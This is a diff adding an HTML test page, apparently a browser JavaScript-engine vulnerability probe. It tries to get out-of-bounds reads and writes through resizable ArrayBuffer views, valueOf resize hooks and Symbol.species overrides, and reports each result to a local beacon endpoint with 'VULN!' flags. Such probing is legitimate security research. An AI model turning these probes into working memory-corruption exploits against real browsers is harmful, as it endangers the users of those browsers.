@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>P1262</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#111;color:#0f0;font:11px/1.4 monospace;padding:8px;overflow-y:auto}
+#log{white-space:pre-wrap;word-break:break-all}
+</style>
+</head>
+<body>
+<div id="log"></div>
+
+<script>
+var L=document.getElementById('log');
+function log(s){L.textContent+=s+'\n';}
+function B(tag,data){
+  try{
+    var u='/beacon.php?tag=P1262-'+encodeURIComponent(tag);
+    if(data)u+='&data='+encodeURIComponent(String(data).slice(0,900));
+    u+='&t='+Date.now();
+    var x=new XMLHttpRequest();x.open('GET',u,false);x.send(null);
+  }catch(e){}
+}
+log('=== P1262: RAB OFFSET VIEW OOB ===');
+B('START','P1262');
+</script>
+
+<!-- A: DataView with byteOffset on RAB — shrink past offset -->
+<script>
+log('\n--- A: DataView byteOffset past shrunk buffer ---');
+(function(){
+  try{
+    var rab=new ArrayBuffer(128, {maxByteLength:256});
+    // Create DataView starting at byte 80
+    var dv=new DataView(rab, 80);
+    B('A0','dv_off='+dv.byteOffset+'|dv_len='+dv.byteLength+'|buf='+rab.byteLength);
+
+    // Write a marker at DV-relative offset 0 (absolute byte 80)
+    dv.setFloat64(0, 123.456);
+    dv.setFloat64(8, 789.012);
+
+    // Shrink buffer to 64 bytes — DV's offset (80) is now past the buffer end
+    rab.resize(64);
+    B('A1','buf='+rab.byteLength+'|dv_off='+dv.byteOffset+'|dv_len='+dv.byteLength);
+
+    // Try reading at DV-relative 0 (absolute 80, now OOB)
+    try{
+      var v=dv.getFloat64(0);
+      B('A2','OOB_READ='+v+'|VULN!');
+    }catch(e){B('A2','read_err:'+e.name+':'+e.message.slice(0,60));}
+
+    // Try writing at DV-relative 0 (absolute 80, now OOB)
+    try{
+      dv.setFloat64(0, 999.999);
+      B('A3','OOB_WRITE=ok|VULN!');
+    }catch(e){B('A3','write_err:'+e.name+':'+e.message.slice(0,60));}
+
+    // Grow back and check
+    rab.resize(128);
+    var after=dv.getFloat64(0);
+    B('A4','grow_back='+after+'|was_123.456='+(after===123.456)+'|was_999.999='+(after===999.999)+'|was_0='+(after===0));
+
+  }catch(e){B('A0','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- B: Float64Array with byteOffset on RAB — shrink past offset -->
+<script>
+log('\n--- B: TypedArray byteOffset past shrunk buffer ---');
+(function(){
+  try{
+    var rab=new ArrayBuffer(128, {maxByteLength:256});
+    // Create Float64Array starting at byte 80, 6 elements (48 bytes: 80..128)
+    var f64=new Float64Array(rab, 80);
+    B('B0','f64_off='+f64.byteOffset+'|f64_len='+f64.length+'|buf='+rab.byteLength);
+
+    f64[0]=111.111;
+    f64[1]=222.222;
+    f64[2]=333.333;
+
+    // Shrink buffer to 64 — f64's offset (80) is past the end
+    rab.resize(64);
+    B('B1','buf='+rab.byteLength+'|f64_off='+f64.byteOffset+'|f64_len='+f64.length);
+
+    // Try reading
+    try{
+      var v=f64[0];
+      B('B2','OOB_READ='+v+'|isUndef='+(v===undefined)+'|VULN='+(v!==undefined));
+    }catch(e){B('B2','read_err:'+e.name);}
+
+    // Try writing
+    try{
+      f64[0]=999.999;
+      B('B3','write_done|CHECKING...');
+    }catch(e){B('B3','write_err:'+e.name);}
+
+    // Grow back and check if write landed
+    rab.resize(128);
+    B('B4','buf='+rab.byteLength+'|f64_len='+f64.length);
+    var after=f64[0];
+    B('B5','after='+after+'|was_111.111='+(after===111.111)+'|was_999.999='+(after===999.999)+'|was_0='+(after===0));
+
+  }catch(e){B('B0','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- C: Subarray on RAB — does subarray track resize? -->
+<script>
+log('\n--- C: subarray on RAB ---');
+(function(){
+  try{
+    var rab=new ArrayBuffer(64, {maxByteLength:256});
+    var f64=new Float64Array(rab);
+    for(var i=0;i<8;i++) f64[i]=(i+1)*10;
+
+    // Create subarray of elements 4-7 (bytes 32-64)
+    var sub=f64.subarray(4);
+    B('C0','sub_off='+sub.byteOffset+'|sub_len='+sub.length+'|sub[0]='+sub[0]);
+
+    // Shrink to 32 bytes — subarray range (32..64) is now OOB
+    rab.resize(32);
+    B('C1','buf='+rab.byteLength+'|sub_off='+sub.byteOffset+'|sub_len='+sub.length);
+
+    // Try reading subarray
+    try{
+      var v=sub[0];
+      B('C2','sub[0]='+v+'|isUndef='+(v===undefined));
+    }catch(e){B('C2','read_err:'+e.name);}
+
+    // Try writing subarray
+    try{
+      sub[0]=777;
+      B('C3','write_done');
+    }catch(e){B('C3','write_err:'+e.name);}
+
+    // Grow back, check
+    rab.resize(64);
+    var after=f64[4];
+    B('C4','f64[4]='+after+'|was_50='+(after===50)+'|was_777='+(after===777)+'|was_0='+(after===0));
+
+  }catch(e){B('C0','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- D: TA.set overlapping same-RAB views with resize between read and write -->
+<script>
+log('\n--- D: TA.set overlapping + resize ---');
+(function(){
+  try{
+    var rab=new ArrayBuffer(64, {maxByteLength:256});
+    var src=new Float64Array(rab, 0, 4);  // elements 0-3
+    var dst=new Float64Array(rab, 16, 4); // elements 2-5 (overlapping at 2-3)
+
+    // Fill source
+    src[0]=10; src[1]=20; src[2]=30; src[3]=40;
+    B('D0','src='+src[0]+','+src[1]+','+src[2]+','+src[3]+
+      '|dst_before='+dst[0]+','+dst[1]+','+dst[2]+','+dst[3]);
+
+    // Override valueOf on the source's Symbol.toPrimitive
+    // Actually for TA.set with TA source, there's no valueOf.
+    // But we can resize between creating the temp buffer and writing it back
+    // by using a Proxy... no, Proxy on TA doesn't work for set.
+
+    // Instead: set from a regular array with valueOf hooks
+    var arr=[{valueOf:function(){ return 100; }},
+             {valueOf:function(){ return 200; }},
+             {valueOf:function(){
+               // Resize during third valueOf — dst might use stale bounds
+               rab.resize(24); // Only 3 Float64 elements total
+               return 300;
+             }},
+             {valueOf:function(){ return 400; }}];
+
+    try{
+      dst.set(arr);
+      B('D1','set_ok|buf='+rab.byteLength+'|dst_len='+dst.length);
+    }catch(e){
+      B('D1','set_err:'+e.name+':'+e.message.slice(0,60)+
+        '|buf='+rab.byteLength+'|dst_len='+dst.length);
+    }
+
+    // Check what's in the buffer
+    rab.resize(64);
+    var all=new Float64Array(rab);
+    var vals=[];
+    for(var i=0;i<all.length;i++) vals.push(i+':'+all[i]);
+    B('D2','all='+vals.join(';'));
+
+  }catch(e){B('D0','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- E: TA.copyWithin on RAB with resize in a getter/proxy -->
+<script>
+log('\n--- E: copyWithin on RAB ---');
+(function(){
+  try{
+    var rab=new ArrayBuffer(64, {maxByteLength:256});
+    var f64=new Float64Array(rab);
+    for(var i=0;i<8;i++) f64[i]=(i+1)*100;
+    B('E0','before='+f64[0]+','+f64[1]+','+f64[2]+','+f64[3]+','+f64[4]+','+f64[5]+','+f64[6]+','+f64[7]);
+
+    // copyWithin(target, start, end) — copies elements within the array
+    // target=4, start=0, end=4 → copies [0..3] to [4..7]
+    // But can we resize during copyWithin? It doesn't call user code normally.
+    // Let's just test the basic behavior first
+    f64.copyWithin(4, 0, 4);
+    B('E1','after='+f64[0]+','+f64[1]+','+f64[2]+','+f64[3]+','+f64[4]+','+f64[5]+','+f64[6]+','+f64[7]);
+
+    // Now test: resize BEFORE copyWithin, make target OOB
+    for(var i=0;i<8;i++) f64[i]=(i+1)*100;
+    rab.resize(32); // Only 4 elements
+    try{
+      f64.copyWithin(2, 0, 4); // target=2 start=0 end=4 → would write to [2,3,4,5] but only [2,3] exist
+      B('E2','copyWithin_ok|buf='+rab.byteLength+'|len='+f64.length);
+    }catch(e){
+      B('E2','copyWithin_err:'+e.name+':'+e.message.slice(0,60));
+    }
+
+    rab.resize(64);
+    var all=[];
+    for(var i=0;i<f64.length;i++) all.push(i+':'+f64[i]);
+    B('E3','vals='+all.join(';'));
+
+  }catch(e){B('E0','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- F: Species returns view on SAME RAB (circular dependency) -->
+<script>
+log('\n--- F: Species returns view on same RAB ---');
+(function(){
+  try{
+    var rab=new ArrayBuffer(128, {maxByteLength:256});
+    var f64_target=new Float64Array(rab, 64); // Second half of buffer
+    var u64_spy=new BigUint64Array(rab); // Full buffer view for reading raw bits
+
+    // Fill first half (source) with marker values
+    var f64_src=new Float64Array(rab, 0, 8);
+    for(var i=0;i<8;i++) f64_src[i]=(i+1)*1.5;
+
+    // Fill second half (target) with sentinel
+    for(var i=0;i<f64_target.length;i++) f64_target[i]=-1;
+
+    var arr=[10,20,30,40,50,60,70,80];
+    arr.constructor={};
+    arr.constructor[Symbol.species]=function(len){ return f64_target; };
+
+    var result=arr.map(function(x){ return x*2; });
+
+    // What got written to the target (second half)?
+    var tvals=[];
+    for(var i=0;i<f64_target.length;i++) tvals.push(i+':'+f64_target[i]);
+    B('F1','target='+tvals.join(';'));
+
+    // Did the source (first half) survive?
+    var svals=[];
+    for(var i=0;i<f64_src.length;i++) svals.push(i+':'+f64_src[i]);
+    B('F2','source='+svals.join(';'));
+
+    // Now the exploit angle: shrink during map so target view goes OOB
+    for(var i=0;i<8;i++) f64_src[i]=(i+1)*1.5;
+    for(var i=0;i<f64_target.length;i++) f64_target[i]=-1;
+
+    var arr2=[10,20,30,40,50,60,70,80];
+    arr2.constructor={};
+    arr2.constructor[Symbol.species]=function(len){ return f64_target; };
+
+    try{
+      var result2=arr2.map(function(x,i){
+        if(i===2) rab.resize(72); // Shrink so target (offset 64) has only 1 element
+        return x*3;
+      });
+      B('F3','map_ok|buf='+rab.byteLength+'|target_len='+f64_target.length);
+    }catch(e){
+      B('F3','map_err:'+e.name+':'+e.message.slice(0,60));
+    }
+
+    // Check what survived
+    rab.resize(128);
+    var afterT=[];
+    for(var i=0;i<f64_target.length;i++) afterT.push(i+':'+f64_target[i]);
+    B('F4','after_target='+afterT.join(';'));
+
+  }catch(e){B('F0','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- G: Auto-length views — TA without explicit length on RAB -->
+<script>
+log('\n--- G: Auto-length TA behavior ---');
+(function(){
+  try{
+    var rab=new ArrayBuffer(64, {maxByteLength:256});
+
+    // Auto-length: no length arg, tracks buffer size
+    var auto=new Float64Array(rab);
+    B('G0','auto_len='+auto.length+'|buf='+rab.byteLength);
+
+    // Fixed-length: explicit length
+    var fixed=new Float64Array(rab, 0, 4);
+    B('G1','fixed_len='+fixed.length);
+
+    // Grow buffer
+    rab.resize(128);
+    B('G2','auto_len='+auto.length+'|fixed_len='+fixed.length+'|buf='+rab.byteLength);
+
+    // Shrink buffer to 24
+    rab.resize(24);
+    B('G3','auto_len='+auto.length+'|fixed_len='+fixed.length+'|buf='+rab.byteLength);
+
+    // Auto should now be 3 elements, fixed should be... what? 4 elements on 24 bytes (3 elements)?
+    try{
+      var v=fixed[3]; // Index 3 = byte 24..32, but buffer is only 24 bytes
+      B('G4','fixed[3]='+v+'|isUndef='+(v===undefined)+'|VULN='+(v!==undefined&&v!==0));
+    }catch(e){B('G4','fixed_read_err:'+e.name);}
+
+    try{
+      fixed[3]=12345;
+      B('G5','fixed_write_done');
+    }catch(e){B('G5','fixed_write_err:'+e.name);}
+
+    // Grow back and check
+    rab.resize(64);
+    var check=new Float64Array(rab);
+    B('G6','idx3='+check[3]+'|was_12345='+(check[3]===12345)+'|was_0='+(check[3]===0));
+
+  }catch(e){B('G0','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<!-- H: Slice of TypedArray on RAB — does .slice() snapshot or track? -->
+<script>
+log('\n--- H: TA.slice on RAB ---');
+(function(){
+  try{
+    var rab=new ArrayBuffer(64, {maxByteLength:256});
+    var f64=new Float64Array(rab);
+    for(var i=0;i<8;i++) f64[i]=(i+1)*10;
+
+    // slice() should create a NEW buffer (non-resizable copy)
+    var sliced=f64.slice(2, 6);
+    B('H1','sliced_len='+sliced.length+'|sliced='+sliced[0]+','+sliced[1]+','+sliced[2]+','+sliced[3]+
+      '|same_buf='+(sliced.buffer===rab));
+
+    // What if we slice with a species that returns a RAB view?
+    var rab2=new ArrayBuffer(64, {maxByteLength:256});
+    var target2=new Float64Array(rab2);
+
+    // Hmm, TypedArray.prototype.slice species works differently
+    // Let's check if Float64Array[Symbol.species] is configurable
+    try{
+      var origSpecies=Float64Array[Symbol.species];
+      B('H2','species='+typeof origSpecies+'|is_func='+(typeof origSpecies==='function'));
+    }catch(e){B('H2','species_err:'+e.name);}
+
+    // Override species on the instance's constructor
+    var CustomTA=function(len){ return new Float64Array(rab2, 0, len/8); };
+    // Actually TA.slice uses the constructor, not species directly
+    // Let's check what TA.slice does with Symbol.species
+
+    var f64b=new Float64Array(rab);
+    try{
+      // Monkey-patch constructor
+      Object.defineProperty(f64b, 'constructor', {
+        value: {[Symbol.species]: function(len){
+          B('H3','species_called|len='+len);
+          return target2;
+        }}
+      });
+      var sliced2=f64b.slice(0, 4);
+      B('H4','sliced2_len='+sliced2.length+'|is_target='+(sliced2===target2));
+    }catch(e){B('H3','slice_species_err:'+e.name+':'+e.message.slice(0,60));}
+
+  }catch(e){B('H0','err:'+e.name+':'+e.message.slice(0,80));}
+})();
+</script>
+
+<script>
+B('DONE','all');
+log('\n=== P1262 COMPLETE ===');
+</script>
+
+</body>
+</html>
